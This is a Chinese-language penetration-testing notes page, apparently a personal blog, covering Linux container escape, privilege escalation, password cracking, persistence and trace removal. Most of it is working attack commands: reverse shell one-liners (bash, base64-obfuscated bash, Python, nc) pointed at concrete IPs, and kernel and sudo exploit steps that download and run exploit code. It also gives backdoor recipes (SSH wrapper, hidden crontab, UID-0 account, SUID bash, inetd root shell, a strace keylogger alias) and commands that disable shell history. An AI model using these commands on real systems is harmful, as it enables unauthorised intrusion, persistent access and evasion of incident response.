---
title: Linux渗透总结
date: 2023/10/15 19:48:25
categories:
- 渗透测试
tags:
- Linux渗透
---



# 判断是否为虚拟机

```bash
systemd-detect-virt
```

返回None则说明是物理机

```bash
whereis vmtoolsd
```



# 容器逃逸

## 如何判断是否在docker容器内

```bash
ls -al /.dockerenv
```

![image-20230901114550082](../images/image-20230901114550082.png?lastModify=1695029992)

```bash
cat /proc/1/cgroup
```

![image-20230901114605623](../images/image-20230901114605623.png?lastModify=1695029992)

![image-20241122212549725](../..\source\images\image-20241122212549725.png)

docker容器逃逸检测脚本[teamssix/container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com)](https://github.com/teamssix/container-escape-check)

## 常见逃逸方法

[Docker 介绍 | T Wiki](http://124.220.192.120:7777/CloudNative/Docker/)

### Docker Remote API 未授权逃逸

docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。

![image-20231023182901150](../images/image-20231023182901150.png)

![image-20231023182819832](../images/image-20231023182819832.png)

### Privileged 特权模式容器逃逸

```bash
sudo docker run -itd --privileged ubuntu:latest /bin/bash # 使用特权模式启动容器
fdisk -l # 查看磁盘文件
mkdir /tmp/test # 创建挂载目录
mount /dev/sda1 /tmp/test # 将宿主机磁盘挂载到挂载目录
chroot /tmp/test # 切换根目录
```

![image-20231023183310012](../images/image-20231023183310012.png)

![image-20231023183617812](../images/image-20231023183617812.png)

### 敏感目录挂载逃逸

```bash
df # 显示文件系统的磁盘空间使用情况，包括文件系统的挂载点
```

以挂载了宿主机`/root`到容器`/root`为例

![image-20231023185041650](../images/image-20231023185041650.png)

### 宿主机内核漏洞导致逃逸

[CVE-2016-5195实验：DirtyCoW与Docker逃逸 (wohin.me)](https://blog.wohin.me/posts/dirtycow-for-escape/)

Pyaload：[scumjr/dirtycow-vdso: PoC for Dirty COW (CVE-2016-5195) (github.com)](https://github.com/scumjr/dirtycow-vdso)

```bash
make
./0xdeadbeef 172.18.0.2:10000
```

**由于最后获得的事实上是一个反弹shell，所以要给出反弹的IP和端口。端口可以随意设置，IP可以用`ifconfig`查看。**

![FE062CE3-C428-4889-ABF2-3423CB1D9D28](../images/FE062CE3-C428-4889-ABF2-3423CB1D9D28.png)

![5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412](../images/5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412.png)

![0E89C848-0E3B-4AFD-B035-F8D46CE032F3](../images/0E89C848-0E3B-4AFD-B035-F8D46CE032F3.png)



## 集成工具

[CDK Home CN · cdk-team/CDK Wiki (github.com)](https://github.com/cdk-team/CDK/wiki/CDK-Home-CN)

CDK包括三个功能模块

1. Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用。
2. Exploit: 提供容器逃逸、持久化、横向移动等利用方式。
3. Tool: 修复渗透过程中常用的linux命令以及与Docker/K8s API交互的命令。



## 补充

[teamssix/awesome-cloud-security: awesome cloud security 收集一些国内外不错的云安全资源，该项目主要面向国内的安全人员 (github.com)](https://github.com/teamssix/awesome-cloud-security)https://github.com/source-xu/docker-vuls)

[一个未公开的容器逃逸方式 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/es/377292.html)



# Linux提权

https://mp.weixin.qq.com/s/tl1Qf1RukOBOcjp4PMXn_w

Getshell/LinuxTQ: 《Linux提权方法论》
https://github.com/Getshell/LinuxTQ



## 辅助工具

### **[GTFOBins](https://gtfobins.github.io/)**

GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制。该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利。需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，**GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限**。

### **beroot**

BeRoot用于检查Linux和Mac OS上常见的错误配置，以找到一种方法来升级我们的特权。检查项包括GTFOBins中的二进制文件、通配符错误、suid、环境变量、NFS、sudo等等

```bash
python2 beroot.py
```

![image-20231015201659431](../images/image-20231015201659431.png)

![image-20231015201711821](../images/image-20231015201711821.png)

![image-20231015201721586](../images/image-20231015201721586.png)



### **Linepeas--不只是提权**

LinPEAS 是一个脚本，用于搜索在 Linux/Unix\*/MacOS 主机上提升权限的可能路径。https://github.com/peass-ng

```
wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/linpeas.sh
```

可尝试利用的结果颜色，红字黄底（99% sure）和红字

![image-20241119234337800](../..\source\images\image-20241119234337800.png)

参数选项

```shell
-o (仅执行选定的检查)：
仅执行指定的检查项目。可以选择多个项目，用逗号分隔。
例如：-o system_information,procs_crons_timers_srvcs_sockets,interesting_files
可选的检查项目包括：
system_information：系统信息
container：容器
cloud：云环境
procs_crons_timers_srvcs_sockets：进程、计划任务、定时器、服务、套接字
network_information：网络信息
users_information：用户信息
software_information：软件信息
interesting_files：有趣的文件
api_keys_regex：API 密钥正则表达式

-r (启用正则表达式检查)：
启用正则表达式检查，这可能会花费几分钟到几小时的时间。

-P (指定密码)：
指定一个密码，用于运行 sudo -l 和通过 su 暴力破解其他用户账户。

-N (不使用颜色)：
不使用颜色高亮显示结果。


网络侦察
-t (自动网络扫描和互联网连接检查)：
自动进行网络扫描和互联网连接检查，并将结果写入文件。

-d (发现主机)：
使用 fping 或 ping 发现指定网段内的主机。
例如：-d 192.168.0.1/24

-p (发现开放端口)：
结合 -d 选项，发现指定网段内主机的开放端口。
默认扫描端口 22, 80, 443, 445, 3389，也可以指定其他端口。
例如：-d 192.168.0.1/24 -p 53,139

-i (扫描单个IP)：
使用 nc 扫描指定的单个IP地址。
默认扫描 nmap 的前1000个端口，也可以指定其他端口。
例如：-i 127.0.0.1 -p 53,80,443,8000,8080
端口转发

-F (端口转发)：
将本地IP和端口转发到远程IP和端口。
例如：-F 127.0.0.1:8080:192.168.1.1:80
```





### **pspy**--进程监控

Pspy是一个命令行工具，用于在不需要root权限的情况下窥探进程。该工具通关循环遍历/proc下的值来获取进程参数信息。比如说我们可以找到一些定时任务进程或其他可疑进程来尝试提权

```bash
./pspy64
```

![image-20231015201909328](../images/image-20231015201909328.png)



### traior--自动化提权🐂

多个linux提权漏洞缝合怪，运行后会给出提权方法，并内置了exp可以直接使用

![image-20231015202209167](../images/image-20231015202209167.png)

![image-20231015202355175](../images/image-20231015202355175.png)

![image-20231015202422512](../images/image-20231015202422512.png)

## 常见提权手法

### 内核提权

强调利用内核漏洞的几个**注意点**：

1. 读源码注释，有exp基本信息和编译方法，不然可能连编译都不会
2. 读源码，不然费劲编译完才发现不适用
3. 读源码，不然遇到一个删全盘的”exp“怎么办
4. 遇到没有gcc的坑爹服务器。这时我们就需要在本地编译。本地编译时不止要看exp源码注释的编译参数，也需要手动调整一下编译的参数，比如给gcc 加-m 32来编译32位。编译问题繁多，有困难找谷歌。

- **脏牛漏洞（CVE-2016-5195）**

  > 漏洞原理：该漏洞具体为，get_user_page内核函数在处理**Copy-on-Write**(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。**修改su或者passwd程序**就可以达到root的目的。

  [PoCs · dirtycow/dirtycow.github.io Wiki](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

- **Dirty Pipe(CVE-2022-0847)**

  - https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

    覆盖 /etc/passwd 中的 root 密码字段并在弹出 root shell 后恢复

  - https://haxx.in/files/dirtypipez.c

    直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来

    ```bash
    wget https://haxx.in/files/dirtypipez.c
    gcc -o dirtypipez dirtypipez.c
    ./dirtypipez /usr/bin/su  #任何具体suid权限的文件均可
    ```

    ![image-20231015204347541](../images/image-20231015204347541.png)



### Docker提权

- 从脏管道（CVE-2022-0847）到 Docker 逃逸

  ![image-20231015202422512](..//images/image-20231015202422512.png?lastModify=1697447453)

- CVE-2022-23222--不稳定

  影响版本：5.8.0 <= Linux 内核 <= 5.16

  https://github.com/tr3ee/CVE-2022-23222.git

- Docker 用户组提权

  [Docker 用户组提权 | T Wiki](http://124.220.192.120:7777/CloudNative/Docker/docker-user-group-privilege-escalation.html)

### suid提权

[谈一谈Linux与suid提权 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)

![image-20230220142509956](../images/image-20230220142509956.png)

> suid全称是**S**et owner **U**ser **ID** up on execution。这是Linux给可执行文件的一个属性。
>
> 设置了s位的程序在运行时，其**Effective UID**将会设置为这个程序的所有者。比如，`/bin/ping`这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其**Effective UID**就是0，等同于拥有了root权限。

![image-20230220142233418](../images/image-20230220142233418.png)

查找具有s位权限的命令

```shell
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

常见suid提权命令

```shell
find . -exec command \;
```

```
./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### sudo提权

> sudo：super user do

#### 不恰当的sudo命令配置

原理：

在**交互模式**以及**无密码**情况下（知道密码直接切换为root用户就好了）可以使用`sudo -l`查找哪些命令可以以root权限执行，使用这些命令创建一个新shell即可提权

![image-20230220161114377](../images/image-20230220161114377.png)

![image-20230220161140688](../images/image-20230220161140688.png)

在vi的ESC模式下输入`!/bin/bash`后按下回车即可变为root权限。



#### Linux sudo权限提升漏洞（CVE-2021-3156）-- 成功率高

**查看sudo版本**

```bash
sudo --version
```

**版本影响**

- sudo 1.8.2 - 1.8.31p2

- sudo 1.9.0 - 1.9.5p1

**简单判断方法**

```bash
sudoedit -s /
```

> 如果显示sudoedit: /: not a regular file，则表示该漏洞存在

**EXP使用**

https://github.com/worawit/CVE-2021-3156

- 对于 glibc 支持并启用了 tcache 的 Linux 发行版（CentOS 8、Ubuntu >= 17.10、Debian 10）

  exploit_nss.py→exploit_timestamp_race.c

- 对于 glibc 不支持 tcache 的 Linux 发行版（Debian 9, Ubuntu 16.04, or Ubuntu 14.04）

  exploit_nss_xxx.py→exploit_defaults_mailer.py→exploit_userspec.py

[blasty/CVE-2021-3156 (github.com)](https://github.com/blasty/CVE-2021-3156)

```bash
make
./sudo-hax-me-a-sandwich num # 选择合适的序号
```

![image-20231015214211618](../images/image-20231015214211618.png)





### 环境变量提权

本质上还是suid提权，只不过具有suid权限的命令是用户自定义的，调用了其他命令，我们可以通过劫持调用的其他命令来提权。

比如有一个root用户自定义的具有suid权限的test命令，调用了系统命令ls，那我们可以找到一个可写目录，通过修改$PATH环境变量，劫持ls命令。

参考[环境变量注入 | Khaz's Blog (fgtbnc.github.io)](https://fgtbnc.github.io/2023/05/31/环境变量注入/)



### 权限配置不当提权

原理：某个脚本或命令以ROOT权限运行，但是低权限用户拥有修改写入权限

- 通过pspy找到可疑进程
- 定时任务
- .....

工具：https://github.com/mi1k7ea/M7-05



### CVE-2021-4034

```
pkexec suid提权
```



### 其他

#### teehee

teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权

核心思路就是利用其在passwd文件中追加一条uid为0的用户条目

```
echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录（空密码不能远程登录）。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限



# Linux信息收集

- 相关命令

  ```bash
  ifconfig
  /sbin/iconfig
  ip addr show
  ```


- 整合工具

  ```bash
  ./gather -a
  ```

  默认在`/tmp/report`下生成结果

  ```bash
  keyword.txt # 这个有点少，要自己加
  result.txt
  tree.txt # 目录结构
  ```

  **自己添加命令整理成sh脚本**

  



# Linux横向移动

- 密码破解

  - 判断`/etc/shadow`或`/etc/passwd`中存储的密码使用的加密算法
  
  - **MD5**: 以 "$1$" 开头。
    - **SHA-256**: 以 "$5$" 开头。
    - **SHA-512**: 以 "$6$" 开头。
    - **Blowfish**: 以 "$2a$"、"$2b$" 或者 "$2y$" 开头。
    - **DES**: 以 "$" 开头，跟着一个数字。
    - **Extended DES**: 以 "$9$" 开头。
    - **Sun MD5**: 以 "$md5$" 开头。
    - **SHA-1**: 以 "$sha1$" 开头。
    - **NTLM**: 以 "$NT$" 或 "$NTLM$" 开头。
  
  - 暴力破解
  
    ```shell
    hashcat.exe  -m 1600  -a  0  "E:\5.0\pass.txt" "E:\5.0\rockyou.txt"
    # -a 0 字典攻击
    # -m 指定密文类型
    # pass.txt中只能放密码密文，/etc/passwd拿到的要去掉user:
    ```
    
    hash id对照表：https://hashcat.net/wiki/doku.php?id=example_hashes
    
    文章：https://xz.aliyun.com/t/4008?time__1311=n4%2BxnD0DyGYQqY5i%3DDCDlhjeK0KPahGRTRrD
    
    
  

# Linux权限维持

## 反弹shell

### 常用命令

- 攻击机监听端口

  ```bash
  nc -lnvp port
  ```

- 被攻击机

  ```bash
  bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'
  bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"
  ```

  ```bash
  python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.174.129',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
  ```

  ```bash
  nc 124.220.192.120 1234 -e /bin/bash
  ```

  **注意点**：用nc进行反弹shell，需要nc是提供-e参数的版本，但是系统apt默认安装的都是不提供反向链接的版本。

  ![image-20230830215804216](../../../blog/source/images/image-20230830215804216.png)

  解决方法：

  - 上传编译好的nc

  - 利用管道符

    被攻击机

    ![image-20230823145240080](../../../blog/source/images/image-20230823145240080.png)

    攻击机

    ![image-20230823145311118](../../../blog/source/images/image-20230823145311118.png)

    ![image-20230823145323881](../../../blog/source/images/image-20230823145323881.png)

    利用1234端口将传入内容交给bash执行，再将内容从端口8888送出去



### 获得交互式shell

```shell
python3 -c  'import pty;pty.spawn("/bin/bash")'
python -c  'import pty;pty.spawn("/bin/bash")'
```

键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行：

```shell
stty raw -echo
fg
```

回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行：

```shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 54 columns 104
```





## SSH后门

### SSH wrapper

被攻击机

> 首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell
>
> 简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。

```shell
cd /usr/sbin/
mv sshd ../bin

# 会导致ssh不能用
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd  
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd

service sshd restart
```

>  \x00\x004A是13377的大端形式

攻击机

```shell
socat STDIO TCP4:IP:22,sourceport=port
```

![image-20230823151639936](../images/image-20230823151639936.png)

修改通信端口

```python
# python2
import struct
port = 19526
buffer = struct.pack('>I6',port)
print repr(buffer)

>>'\x00\x00LF'

echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd 
变为
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..LF/);' >>sshd 
```



### SSH 软连接后门

> 1. PAM认证机制，若sshd服务中开启了PAM认证机制（默认开启`cat /etc/ssh/sshd_config|grep UsePAM`），当程序执行时，PAM模块则会搜寻PAM相关设定文件，设定文件一般是在/etc/pam.d/。若关闭则会验证密码，无法建立软链接后门。
>
> 2. pam_rootok.so主要作用是使得uid为0的用户，即root用户可以直接通过认证而不需要输入密码。
>
> 3. `find /etc/pam.d |xargs grep "pam_rootok" `
>
>    ![image-20230830230859930](../images/image-20230830230859930.png)
>
>    **这些都可以作为ssh软链接后门**：当我们通过特定的端口连接ssh后，应用在启动过程中就会去找到配置文件，如：我们的软链接文件为/tmp/su，那么应用就会找/etc/pam.d/su作为配置文件，因为/etc/pam.d/su使用了pam_rootok.so所以无需验证密码即可连接。

失败了。。

![image-20230830222011164](../images/image-20230830222011164.png)

是因为SSH wrapper

```shell
echo '#!/usr/bin/perl' >sshd
```

需要重新安装ssh

```shell
ln -sf /usr/sbin/su /tmp/su
/tmp/su -oPort=8888
```

![image-20230830230550836](../images/image-20230830230550836.png)

实际上是随便输一个密码就可以登陆，但是不能不输密码。



### SSH 公钥免密登陆

之前打靶机的时候的笔记

ssh验证方式

![image-20230304140701229](../images/image-20230304140701229-1693405604693.png)

这里第二种：假设主机A要用SSH登录到主机B，那么只要主机A有私钥，主机B有对应的公钥即可，与是主机A生产的，还是主机B生成的无关。

```shell
# host为主机名（root）
ssh host@ip -p port（password验证）
ssh host@ip -i id_rsa -p port(密钥验证，私钥权限要为600才可以使用)
```

配置文件`/etc/ssh/sshd_config`

```shell
PasswordAuthentication yes 						#启用密码验证
PubkeyAuthentication yes 						#启用密钥对验证
AuthorizedKeysFile .ssh/authorized_keys 		#指定公钥库文件
```

流程

```shell
ssh-keygen -t rsa # 生成密钥对
cat id_rsa.pub > authorized_keys #将公钥内容放到目标.ssh/authorized_keys里 

ssh-copy-id host@ip -p 22 #将公钥上传至远程服务器用户目录中
```





## strace后门

通过**命令替换（命令行启动文件加入alias）**动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。

```shell
# 监控ssh
echo "alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'" >> /root/.bashrc
# 立即生效
source /root/.bashrc
```

kali没有strace，但是云服务器默认是装了的

![image-20230830223830491](../images/image-20230830223830491.png)

查看记录的ssh连接

```shell
cat /tmp/.ssh.log 
```

![image-20230830232440346](../images/image-20230830232440346.png)

## 自启动文件后门

写入自启动文件中

- 开机启动项

  ```bash
  /etc/init.d/
  /etc/profile.d/
  /etc/rc.d/xxx # 在xxx中添加需要开机执行的脚本的绝对路径
  ```

- bash shell启动项

  ```bash
  /etc/profile 
  $HOME/.bash_profile
  $HOME/.bashrc 
  $HOME/.bash_login 
  $HOME/.profile 
  ```

  

## 定时任务后门

```shell
echo xxx > /tmp/1.elf
chmod +x /tmp/1.elf

(crontab -l;printf "*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")
```

![image-20230830235507613](../images/image-20230830235507613.png)

将no crontab for `whoami`文件写到/var/spool/cron/crontabs/root中，而crontab -l就是列出了该文件的内容。所以当管理员使用crontab -l查看定时任务时，就会看到no crontab for root，从而起到了隐藏的效果。

![image-20230830235746458](../images/image-20230830235746458.png)

## 添加超级用户

应急响应第一个就排查`/etc/passwd`

```shell
useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test
```

![image-20230831001351639](../images/image-20230831001351639.png)



## Suid后门

> **SUID权限仅对二进制程序有效**

```shell
cp /bin/bash /tmp/.long #将bash命令cp到.long二进制程序中
chmod u+s /tmp/.long #赋予SUID文件的权限
```

```shell
/tmp/.long -p 
```

> bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。

![image-20230831155343319](../images/image-20230831155343319.png)

## inetd后门

inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。

```bash
# 安装
apt-get install openbsd-inetd  
# 写入配置文件
echo 'daytime stream tcp nowait root /bin/bash bash -i' >> /etc/inetd.conf
# 请求daytime服务对应的13端口
nc -vv 192.168.111.128 13
```

![image-20231015225609770](../images/image-20231015225609770.png)

配置解释

```bash
<service_name> <sock_type> <proto：TCP/UDP> <flags> <user> <server_path：绝对路径> <args>
daytime stream tcp nowait root /bin/bash bash -i # 当外部请求名为daytime的服务时就弹shell
```

更改的话只需要修改service_name和nc连接的端口，服务与端口的映射关系在`/etc/services`中



## ICMP后门

https://github.com/andreafabrizi/prism



## DNS后门

https://github.com/DamonMohammadbagher/NativePayload_DNS
https://github.com/iagox86/dnscat2
http://code.kryo.se/iodine



## 进程注入

https://github.com/gaffe23/linux-inject
https://sourceforge.net/projects/cymothoa/files/
https://github.com/screetsec/Vegile



## 隐藏文件/目录技巧

- 创建以.开头的隐藏文件

  用`ls -a`才能看到

- 建立文件名为`...`的文件

- 参数混淆

  > 下面两种方法可以使用`rm -- -rm`删除

  - 建立文件名为`-rm`的文件

  ![image-20231015223351352](../images/image-20231015223351352.png)

  

  - 建立文件名为`--`的文件

    ![image-20231015223510528](../images/image-20231015223510528.png)

    既不报错，也没有删除

- chattr隐藏权限

  > chattr +i 是一个 Linux 命令，用于将文件或目录设置为不可修改（immutable）。当应用了 +i 属性后，文件或目录将无法被修改、删除、重命名或链接。这个属性主要用于保护关键系统文件或目录，防止它们被意外或恶意篡改。请注意，这个命令需要在**具有管理员权限的用户**下执行

  ```bash
  chattr +i hack.sh  #lsattr才可以看到该权限
  ```

![image-20230831163015163](../images/image-20230831163015163.png)

```bash
# 删除
chattr -i hack.sh
rm -rf hack.sh
```





## 工具

需要python3环境[RuoJi6/HackerPermKeeper (github.com)](https://github.com/RuoJi6/HackerPermKeeper)

| 🔒权限维持模块                | centos | Ubuntu | 推荐指数   | 需要权限     | 备注                                                         | py2  | py3  |
| ---------------------------- | ------ | ------ | ---------- | ------------ | ------------------------------------------------------------ | ---- | ---- |
| OpenSSH后门万能密码&记录密码 | ❌      | ✔️      | ⭐          | root         | 此后门需要很老的内核版本，而且需要很多依赖环境               | ❌    | ✔️    |
| PAM后门                      | ❌      | ❌      | ⭐          | ❌            | 此后门需要很老的内核版本，而且需要很多依赖环境               | ❌    | ❌    |
| ssh软链接                    | ✔️      | ✔️      | ⭐ ⭐        | root         | 容易被发现                                                   | ✔️    | ✔️    |
| ssh公私密钥                  | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐ ⭐  | User         | 发现程度很难，参考了挖矿病毒                                 | ✔️    | ✔️    |
| 后门帐号                     | ✔️      | ✔️      | ⭐ ⭐ ⭐      | root         | 用命令添加账户，不会创建用户home目录[有一个是直接指向root目录] | ✔️    | ✔️    |
| crontab计划任务              | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐    | User or root | 难以发现，通过执行计划任务                                   | ✔️    | ✔️    |
| Strace后门                   | ✔️      | ✔️      | ⭐ ⭐        | root         | 键盘记录的后门                                               | ✔️    | ✔️    |
| Alias后门                    | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐    | root         | 别名后门，难以发现，但是需要用户去执行命令                   | ✔️    | ✔️    |
| Rootkit后门[检测]            | ❌      | ❌      | ⭐ ⭐ ⭐      | root         | 难以发现，但是安装复杂，而且指定内核版本                     | ❌    | ❌    |
| 空格不记录命令               | ✔️      | ✔️      | ⭐ ⭐ ⭐⭐⭐⭐   | root         | 有的服务器设置了空格记录执行命令，执行这个脚本快速设置不记录空格命令 | ✔️    | ✔️    |
| ssh软链接&crontab            | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐    | root         | 快速生成软链接，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行 | ✔️    | ✔️    |
| check.py                     | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐⭐⭐  | User         | 快速检测目标机器可以使用那个权限维持模块                     | ✔️    | ✔️    |
| sshkey密钥&crontab           | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐⭐ ⭐ | User or root | 快速生成ssh密钥，并且执行计划任务，每分钟判断当前密钥和多个文件是否存在，如果被kill掉，就重新执行 | ✔️    | ✔️    |
| php权限维持不死免杀马        | ✔️      | ✔️      | ⭐ ⭐ ⭐ ⭐⭐ ⭐ | User or root | phpweb权限维持马                                             | ✔️    | ✔️    |



# Linux痕迹清理

历史命令

```bash
# 禁用了Shell环境中的命令历史跟踪和存储
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; 
export HISTFILE=/dev/null; 
export HISTSIZE=0; 
export HISTFILESIZE=0
```

[入侵痕迹清理 | Khaz's Blog (fgtbnc.github.io)](https://fgtbnc.github.io/2023/06/01/入侵痕迹清理/#Linux入侵痕迹清理)



# Linux文件传输

https://www.cnblogs.com/yokan/p/16069234.html

SCP

```bash
scp -P port file root@104.243.25.78:/root/source_code
```

需要输入ssh密码，所以要先获得交互式shell



# 其他

```bash
find / -name "*.conf"

find / -name "*python*" -type f -executable 2>/dev/null
```

上传的php无法执行

```bash
在php开头添加 #!/bin/php并执行chmod +x xx.php
```

